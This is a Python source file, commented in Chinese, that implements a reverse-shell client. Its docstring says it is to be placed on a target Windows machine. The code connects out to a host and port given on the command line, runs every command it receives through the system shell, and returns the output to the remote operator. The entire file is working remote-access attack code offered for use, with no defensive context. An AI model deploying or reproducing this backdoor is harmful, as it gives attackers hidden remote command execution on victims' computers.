# -*- coding: utf-8 -*-
"""
这个文件放在目标机器(Windows系统)
"""
import sys
import socket
from subprocess import Popen, PIPE
from optparse import OptionParser


def client_conn_server(options):
    host = options.host
    port = int(options.port)
    BUFSIZE = 10240
    ADDR = (host, port)

    tcp_cient = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_cient.connect(ADDR)

    print("客户端启动...\n")

    # 数据交互循环
    while True:
        data = tcp_cient.recv(BUFSIZE).decode('utf-8')
        if data:
            try:
                cmd = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                cmd_data, cmd_err = cmd.communicate()
                if cmd_err:
                    tcp_cient.send(cmd_err)
                tcp_cient.send(cmd_data)

            except Exception as e:
                print(e)
                continue


if __name__ == '__main__':
    parser = OptionParser()
    # actions 有一组固定的值可供选择，默认是’store‘，表示将命令行参数值保存在 options 对象里。
    parser.add_option("-H", "--host", dest="host", help=" the server ip")
    parser.add_option("-p", "--port", dest="port", help="the ports same with server's")
    # 取值
    (options, args) = parser.parse_args()

    if options.host and options.port:
        client_conn_server(options)
    else:
        # 自带的帮助信息打印
        parser.print_help()
        sys.exit(1)
